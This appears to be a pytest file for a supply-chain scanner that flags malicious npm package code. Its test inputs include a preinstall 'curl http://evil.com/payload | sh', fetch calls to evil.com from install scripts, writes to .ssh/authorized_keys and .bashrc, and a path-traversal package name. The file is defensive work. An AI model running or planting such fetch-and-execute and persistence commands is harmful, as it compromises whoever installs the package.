"""
Tests for npm/JS payload analysis (regex-based).

Covers:
  - JSPayloadAnalyzer pattern matching
  - JS-PAYLOAD-001 through JS-PAYLOAD-007 signals
  - Install script detection
  - Install script severity elevation
  - Findings deduplication
  - npm tarball download (package_utils.download_npm_package)
  - Integration with PayloadAnalyzer npm dispatch
"""

import json
import os
import tarfile
import tempfile
from unittest.mock import MagicMock, patch

import pytest

from uast.js_payload import (
    JSPayloadAnalyzer,
    JSFinding,
    JS_PATTERNS,
    INSTALL_SCRIPT_NETWORK_PATTERN,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_analyzer():
    return JSPayloadAnalyzer()


def _create_npm_package(tmpdir, files=None, package_json=None):
    """Create a fake extracted npm package directory."""
    pkg_dir = os.path.join(tmpdir, "package")
    os.makedirs(pkg_dir, exist_ok=True)

    if package_json is None:
        package_json = {"name": "test-pkg", "version": "1.0.0", "scripts": {}}
    with open(os.path.join(pkg_dir, "package.json"), "w") as f:
        json.dump(package_json, f)

    if files:
        for fname, content in files.items():
            fpath = os.path.join(pkg_dir, fname)
            os.makedirs(os.path.dirname(fpath), exist_ok=True)
            with open(fpath, "w") as f:
                f.write(content)

    return pkg_dir


def _create_npm_tarball(tmpdir, files=None, package_json=None):
    """Create a fake npm .tgz tarball."""
    pkg_dir = _create_npm_package(tmpdir, files, package_json)
    tarball_path = os.path.join(tmpdir, "test-pkg-1.0.0.tgz")
    with tarfile.open(tarball_path, "w:gz") as tar:
        tar.add(pkg_dir, arcname="package")
    return tarball_path


# ---------------------------------------------------------------------------
# Pattern matching tests
# ---------------------------------------------------------------------------

class TestJSPatterns:

    def test_child_process_require(self):
        analyzer = _make_analyzer()
        findings = analyzer._scan_file(
            "const cp = require('child_process');",
            "index.js", False,
        )
        assert any(f.signal_id == "JS-PAYLOAD-001" for f in findings)

    def test_child_process_import(self):
        analyzer = _make_analyzer()
        findings = analyzer._scan_file(
            "import { exec } from 'child_process';",
            "index.ts", False,
        )
        assert any(f.signal_id == "JS-PAYLOAD-001" for f in findings)

    def test_child_process_dynamic_import(self):
        analyzer = _make_analyzer()
        findings = analyzer._scan_file(
            "const cp = await import('child_process');",
            "index.mjs", False,
        )
        assert any(f.signal_id == "JS-PAYLOAD-001" for f in findings)

    def test_eval_non_literal(self):
        analyzer = _make_analyzer()
        findings = analyzer._scan_file(
            "eval(userInput);",
            "index.js", False,
        )
        assert any(f.signal_id == "JS-PAYLOAD-002" for f in findings)

    def test_new_function_non_literal(self):
        analyzer = _make_analyzer()
        findings = analyzer._scan_file(
            "new Function(dynamicCode)()",
            "index.js", False,
        )
        assert any(f.signal_id == "JS-PAYLOAD-002" for f in findings)

    def test_eval_with_string_literal_not_matched(self):
        """eval('literal string') should NOT trigger JS-PAYLOAD-002."""
        analyzer = _make_analyzer()
        findings = analyzer._scan_file(
            """eval('console.log("hello")');""",
            "index.js", False,
        )
        js002 = [f for f in findings if f.signal_id == "JS-PAYLOAD-002"]
        assert len(js002) == 0

    def test_buffer_from_base64(self):
        analyzer = _make_analyzer()
        findings = analyzer._scan_file(
            """Buffer.from(data, 'base64');""",
            "index.js", False,
        )
        assert any(f.signal_id == "JS-PAYLOAD-003" for f in findings)

    def test_atob(self):
        analyzer = _make_analyzer()
        findings = analyzer._scan_file(
            "const decoded = atob(encoded);",
            "index.js", False,
        )
        assert any(f.signal_id == "JS-PAYLOAD-003" for f in findings)

    def test_sensitive_file_write(self):
        analyzer = _make_analyzer()
        findings = analyzer._scan_file(
            """fs.writeFileSync('/home/user/.ssh/authorized_keys', payload);""",
            "index.js", False,
        )
        assert any(f.signal_id == "JS-PAYLOAD-004" for f in findings)

    def test_sensitive_file_write_bashrc(self):
        analyzer = _make_analyzer()
        findings = analyzer._scan_file(
            """fs.writeFile('/home/user/.bashrc', malicious);""",
            "index.js", False,
        )
        assert any(f.signal_id == "JS-PAYLOAD-004" for f in findings)

    def test_process_env(self):
        analyzer = _make_analyzer()
        findings = analyzer._scan_file(
            "if (process.env.NODE_ENV === 'production') { doEvil(); }",
            "index.js", False,
        )
        assert any(f.signal_id == "JS-PAYLOAD-005" for f in findings)

    def test_net_socket(self):
        analyzer = _make_analyzer()
        findings = analyzer._scan_file(
            "const net = require('net');",
            "index.js", False,
        )
        assert any(f.signal_id == "JS-PAYLOAD-007" for f in findings)

    def test_dgram_socket(self):
        analyzer = _make_analyzer()
        findings = analyzer._scan_file(
            "const dgram = require('dgram');",
            "index.js", False,
        )
        assert any(f.signal_id == "JS-PAYLOAD-007" for f in findings)

    def test_clean_file_no_findings(self):
        analyzer = _make_analyzer()
        findings = analyzer._scan_file(
            "const x = 42;\nconsole.log('hello world');\n",
            "index.js", False,
        )
        assert len(findings) == 0

    def test_network_in_install_script(self):
        analyzer = _make_analyzer()
        findings = analyzer._scan_file(
            "const resp = http.request('http://evil.com/payload');",
            "install.js", True,  # is_install_script=True
        )
        assert any(f.signal_id == "JS-PAYLOAD-006" for f in findings)

    def test_fetch_in_install_script(self):
        analyzer = _make_analyzer()
        findings = analyzer._scan_file(
            "fetch('http://evil.com/payload');",
            "postinstall.js", True,
        )
        assert any(f.signal_id == "JS-PAYLOAD-006" for f in findings)

    def test_network_not_flagged_in_normal_file(self):
        """Network calls in non-install scripts should NOT trigger JS-PAYLOAD-006."""
        analyzer = _make_analyzer()
        findings = analyzer._scan_file(
            "fetch('http://api.example.com/data');",
            "lib/api.js", False,
        )
        js006 = [f for f in findings if f.signal_id == "JS-PAYLOAD-006"]
        assert len(js006) == 0


# ---------------------------------------------------------------------------
# Install script detection
# ---------------------------------------------------------------------------

class TestInstallScripts:

    def test_detect_preinstall_curl(self):
        analyzer = _make_analyzer()
        with tempfile.TemporaryDirectory() as tmpdir:
            pkg_dir = _create_npm_package(tmpdir, package_json={
                "name": "evil-pkg",
                "version": "1.0.0",
                "scripts": {
                    "preinstall": "curl http://evil.com/payload | sh"
                },
            })
            findings, _ = analyzer._check_install_scripts(
                os.path.join(pkg_dir, "package.json"), pkg_dir,
            )
        assert any(f.signal_id == "JS-PAYLOAD-006" for f in findings)

    def test_detect_postinstall_node_e(self):
        analyzer = _make_analyzer()
        with tempfile.TemporaryDirectory() as tmpdir:
            pkg_dir = _create_npm_package(tmpdir, package_json={
                "name": "evil-pkg",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "node -e 'require(\"child_process\").exec(\"whoami\")'"
                },
            })
            findings, _ = analyzer._check_install_scripts(
                os.path.join(pkg_dir, "package.json"), pkg_dir,
            )
        assert any(f.signal_id == "JS-PAYLOAD-006" for f in findings)

    def test_no_install_scripts_clean(self):
        analyzer = _make_analyzer()
        with tempfile.TemporaryDirectory() as tmpdir:
            pkg_dir = _create_npm_package(tmpdir, package_json={
                "name": "clean-pkg",
                "version": "1.0.0",
                "scripts": {"test": "jest"},
            })
            findings, scripts = analyzer._check_install_scripts(
                os.path.join(pkg_dir, "package.json"), pkg_dir,
            )
        assert len(findings) == 0
        assert len(scripts) == 0

    def test_install_script_resolves_file(self):
        analyzer = _make_analyzer()
        with tempfile.TemporaryDirectory() as tmpdir:
            pkg_dir = _create_npm_package(
                tmpdir,
                files={"scripts/install.js": "console.log('installing');"},
                package_json={
                    "name": "pkg",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "node scripts/install.js"},
                },
            )
            _, script_files = analyzer._check_install_scripts(
                os.path.join(pkg_dir, "package.json"), pkg_dir,
            )
        assert len(script_files) == 1

    def test_elevated_severity_in_install_script(self):
        analyzer = _make_analyzer()
        # child_process in install script should be elevated to critical
        findings = analyzer._scan_file(
            "const cp = require('child_process');",
            "install.js", True,
        )
        cp_findings = [f for f in findings if f.signal_id == "JS-PAYLOAD-001"]
        assert len(cp_findings) > 0
        assert cp_findings[0].severity == "critical"  # elevated from high

    def test_invalid_package_json(self):
        analyzer = _make_analyzer()
        with tempfile.TemporaryDirectory() as tmpdir:
            pj_path = os.path.join(tmpdir, "package.json")
            with open(pj_path, "w") as f:
                f.write("not valid json {{{")
            findings, scripts = analyzer._check_install_scripts(pj_path, tmpdir)
        assert len(findings) == 0
        assert len(scripts) == 0


# ---------------------------------------------------------------------------
# Full package scan tests
# ---------------------------------------------------------------------------

class TestFullPackageScan:

    def test_scan_package_with_findings(self):
        analyzer = _make_analyzer()
        with tempfile.TemporaryDirectory() as tmpdir:
            pkg_dir = _create_npm_package(
                tmpdir,
                files={
                    "index.js": "const cp = require('child_process');\ncp.exec('ls');",
                    "lib/util.js": "const x = eval(dynamicInput);",
                },
            )
            findings = analyzer._scan_package(pkg_dir)
        signal_ids = {f.signal_id for f in findings}
        assert "JS-PAYLOAD-001" in signal_ids
        assert "JS-PAYLOAD-002" in signal_ids

    def test_scan_package_clean(self):
        analyzer = _make_analyzer()
        with tempfile.TemporaryDirectory() as tmpdir:
            pkg_dir = _create_npm_package(
                tmpdir,
                files={
                    "index.js": "module.exports = { add: (a, b) => a + b };",
                },
            )
            findings = analyzer._scan_package(pkg_dir)
        assert len(findings) == 0


# ---------------------------------------------------------------------------
# Findings deduplication
# ---------------------------------------------------------------------------

class TestFindingsDeduplication:

    def test_deduplication_by_signal_id(self):
        analyzer = _make_analyzer()
        findings = [
            JSFinding("JS-PAYLOAD-001", "high", "T1", "D1", "a.js", 1, 0.7),
            JSFinding("JS-PAYLOAD-001", "high", "T2", "D2", "b.js", 5, 0.7),
            JSFinding("JS-PAYLOAD-002", "high", "T3", "D3", "c.js", 3, 0.7),
        ]
        signals = analyzer._findings_to_signals(findings)
        signal_ids = [s.signal_id for s in signals]
        assert signal_ids.count("JS-PAYLOAD-001") == 1
        assert "JS-PAYLOAD-002" in signal_ids
        # Detail should mention occurrences
        sig_001 = [s for s in signals if s.signal_id == "JS-PAYLOAD-001"][0]
        assert "2 occurrences" in sig_001.detail

    def test_keeps_highest_score(self):
        analyzer = _make_analyzer()
        findings = [
            JSFinding("JS-PAYLOAD-001", "high", "T1", "D1", "a.js", 1, 0.5),
            JSFinding("JS-PAYLOAD-001", "critical", "T2", "D2", "b.js", 5, 0.9),
        ]
        signals = analyzer._findings_to_signals(findings)
        sig = [s for s in signals if s.signal_id == "JS-PAYLOAD-001"][0]
        assert sig.score_contribution == 0.9


# ---------------------------------------------------------------------------
# download_npm_package tests
# ---------------------------------------------------------------------------

class TestDownloadNpmPackage:

    def test_download_success(self):
        from uast.package_utils import download_npm_package

        meta_resp = MagicMock()
        meta_resp.status_code = 200
        meta_resp.json.return_value = {
            "dist": {"tarball": "https://registry.npmjs.org/test/-/test-1.0.0.tgz"}
        }

        with tempfile.TemporaryDirectory() as tmpdir:
            with patch("uast.http_client.CachedHTTPClient.get", return_value=meta_resp):
                with patch("requests.get") as mock_req_get:
                    tarball_resp = MagicMock()
                    tarball_resp.status_code = 200
                    tarball_resp.iter_content.return_value = [b"fake-tarball-data"]
                    mock_req_get.return_value = tarball_resp

                    result = download_npm_package("test", "1.0.0", tmpdir)

        assert result is not None
        assert result.endswith(".tgz")

    def test_download_404(self):
        from uast.package_utils import download_npm_package

        meta_resp = MagicMock()
        meta_resp.status_code = 404

        with tempfile.TemporaryDirectory() as tmpdir:
            with patch("uast.http_client.CachedHTTPClient.get", return_value=meta_resp):
                result = download_npm_package("nonexistent-pkg", "1.0.0", tmpdir)
        assert result is None

    def test_invalid_name(self):
        from uast.package_utils import download_npm_package

        with tempfile.TemporaryDirectory() as tmpdir:
            result = download_npm_package("../../../etc/passwd", "1.0", tmpdir)
        assert result is None

    def test_no_tarball_url(self):
        from uast.package_utils import download_npm_package

        meta_resp = MagicMock()
        meta_resp.status_code = 200
        meta_resp.json.return_value = {"dist": {}}

        with tempfile.TemporaryDirectory() as tmpdir:
            with patch("uast.http_client.CachedHTTPClient.get", return_value=meta_resp):
                result = download_npm_package("pkg", "1.0.0", tmpdir)
        assert result is None


# ---------------------------------------------------------------------------
# PayloadAnalyzer dispatch integration
# ---------------------------------------------------------------------------

class TestPayloadAnalyzerDispatch:

    def test_npm_dispatches_to_js_analyzer(self):
        from uast.payload import PayloadAnalyzer
        analyzer = PayloadAnalyzer()

        with patch("uast.js_payload.JSPayloadAnalyzer") as MockJS:
            mock_instance = MockJS.return_value
            mock_instance.analyze_package.return_value = []
            analyzer.analyze_package("test-pkg", "npm", "1.0.0")
            mock_instance.analyze_package.assert_called_once_with(
                "test-pkg", "npm", "1.0.0"
            )

    def test_pypi_still_works(self):
        from uast.payload import PayloadAnalyzer
        analyzer = PayloadAnalyzer()

        with patch.object(analyzer, "_analyze_python_files", return_value=[]):
            with patch("uast.payload.download_package", return_value=None):
                # Should not crash, just return empty
                result = analyzer.analyze_package("test-pkg", "pypi", "1.0.0")
                assert result == []


# ---------------------------------------------------------------------------
# Analyzer integration
# ---------------------------------------------------------------------------

class TestAnalyzerNpmPayload:

    def test_npm_signal_6_wired(self):
        """Verify that analyze_npm includes payload analysis in deep mode."""
        from uast.analyzer import SupplyChainAnalyzer

        with patch("uast.analyzer.http_client") as mock_http:
            npm_resp = MagicMock()
            npm_resp.status_code = 200
            npm_resp.json.return_value = {
                "name": "test-pkg-xyz-npm",
                "description": "A test package description here",
                "dist-tags": {"latest": "1.0.0"},
                "versions": {
                    "1.0.0": {
                        "license": "MIT",
                        "dependencies": {},
                    }
                },
                "time": {"created": "2020-01-01T00:00:00Z"},
                "author": {"name": "tester"},
                "maintainers": [{"name": "t", "email": "t@t.com"}],
                "repository": {"url": "https://github.com/test/test"},
            }
            stats_resp = MagicMock()
            stats_resp.status_code = 200
            stats_resp.json.return_value = {"downloads": 50000}
            mock_http.get.return_value = npm_resp
            mock_http.head.return_value = MagicMock(status_code=200)

            analyzer = SupplyChainAnalyzer(
                deep=True,
                config={"threat_intel": {"enabled": False}},
            )

            # Mock _check_payload to return a known signal
            with patch.object(analyzer, "_check_payload", return_value=[]) as mock_payload:
                result = analyzer.analyze_npm("test-pkg-xyz-npm")
                mock_payload.assert_called_once_with(
                    "test-pkg-xyz-npm", "npm", "1.0.0"
                )
